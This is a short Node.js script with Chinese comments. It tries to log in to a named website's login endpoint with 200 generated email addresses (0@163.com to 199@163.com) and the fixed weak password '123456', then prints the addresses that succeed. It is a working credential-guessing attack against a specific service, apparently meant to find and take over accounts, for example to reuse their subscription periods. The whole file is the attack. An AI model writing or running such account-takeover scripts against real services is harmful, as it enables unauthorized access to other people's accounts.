const Axios = require("axios")
const cheerio = require("cheerio");

const axios = Axios.default;
// 记录最长有效期
let max = 0
// 记录最长有效期对应的邮箱（账号）
let maxEmail = "";

(async () => {
    for (let i = 0; i < 200; i++) {
        const email = `${i}@163.com`;
        let res = await axios.post('http://www.91goout.com/auth/login', {
            email,
            passwd: "123456"
        })

        // res.data.ret === 1 为true才说明账号存在
        if (res.data.ret === 1) {
            console.log(email)
        }
    }
})()







